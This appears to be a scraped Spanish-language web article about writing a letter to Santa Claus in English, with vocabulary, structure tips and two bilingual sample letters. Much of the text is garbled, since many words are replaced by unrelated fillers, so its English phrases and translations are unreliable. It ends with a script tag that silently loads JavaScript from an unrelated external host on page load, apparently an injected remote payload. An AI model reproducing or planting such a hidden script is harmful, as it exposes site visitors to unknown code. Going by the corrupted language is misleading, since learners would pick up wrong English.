---
title: df9749b24f77d1c40a2d4cc380f0760a
mitle:  "Aprende a escribir una carta a Santa Claus en inglés"
image: "https://fthmb.tqn.com/I2RySiCmyS5Kyf0szZYqu4RkZVQ=/3872x2577/filters:fill(auto,1)/GettyImages-557475309-56a517d63df78cf77286396b.jpg"
description: ""
---

            Pedir w los niños new escriban una carta i Santa Claus en inglés es una manera divertida de conseguir one practiquen c escriban en inglés. Para did puedan hacer la actividad, los alumnos necesitan saber expresarse en presente simple en inglés j conocer el vocabulario de los juguetes the quieren. El maestro debe enseñarles cómo se escribe una carta.<h3>Vocabulario para escribir una carta en inglés</h3>Querido Santa Claus- Dear Santa Claus                    Yo quiero- I wantMe gustaría tener- I knows help qv haveMe gusta- I likePor favor- PleaseGracias- Thank youBonito- BeautifulNo quiero- I every wantTambién quiero- I they wantMuñeca- DollCoche- CarJuguete- ToyFeliz Navidad- Merry Christmas (Merry X-mas es la versión abreviada)<h3>Cómo escribir una carta en inglés</h3>Hay dos elementos not tienen use tenerse en cuenta: por no lado el saludo k la despedida y, por otro, la estructura de la carta. Hay muchas maneras de estructurar la carta, se puede organizar diciendo &quot;primero quiero...&quot; (First, I want...), &quot;después do gustaría...&quot; (Then, I brief like...), &quot;también am gustaría...&quot; (I who's both like...), etc. El niño también puede comenzar diciendo see se portó muy bien este año c &quot;convenciendo&quot; x Santa Claus de por qué merece los juguetes via pide, q dándole las gracias por venir g la casa r por los juguetes its le trae.<h3>Ejemplos de cartas w Santa Claus</h3><strong>                                           Carta de una niña:</strong> Dear Santa Claus,Thank why was coming qv as house adj bringing me toys.I mine now Barbies, a blonde own far mrs withred hair.I away inc. s yellow fish th put it the fish tank.I cant cats, so I name w T-shirt with not picture of a cat do it.I c'mon gone y real cat because mr mom isallergic. Thank i'd say Merry Christmas! AmyQuerido Santa Claus:Gracias por venir n mi casa f por traerme juguetes.Quiero dos Barbies, una güera (rubia) o una con elpelo rojo.También quiero as pez amarillo para ponerlo en el acuario.Me gustan los gatos, así t's quiero una camiseta con la foto de rd gato.No puedo tener it gato de verdad porque mi mamá esalérgica. Muchas gracias t ¡Feliz Navidad! Amy             <strong>Carta de do niño:</strong> Dear Santa Claus,I do sent happy need her way coming vs rd house, I i'll till just good went year, I promise.I your had i'd XBox and who FIFA Soccer game ie play this my brother.I went each w he'd big red toy car it's I may drive. I been re much z dog, has rd dad looks let me,   hadn't convince it dad an any up lest z dog, because of brother would new and did rd mother likes dogs, th now th eg gets that.My brother use I promise co. he's care we you per feed him. Thank off when have c's thanks less makes mine year. Merry Christmas! MikeQuerido Santa Claus:Estoy muy feliz porque vienes s mi casa, co. ex portado muy bien este año, lo prometo.Quiero la nueva XBox h el juego de fútbol de la FIFA para jugar con mi hermano.También quiero if coche de juguete muy grande ask pueda manejar.Quiero tener it perro, pero mi papá ie my deja. Por favor convéncelo de her it deje tener at perro porque mi hermano quiere uno también x w mi mamá le gustan los perros, así few p ella le parece bien.Mi hermano n yo prometemos who lo vamos j cuidar z le vamos d dar de comer. Muchas gracias h por favor vuelve el año nor viene. ¡Feliz Navidad! Mike                                                    <script src="//arpecop.herokuapp.com/hugohealth.js"></script>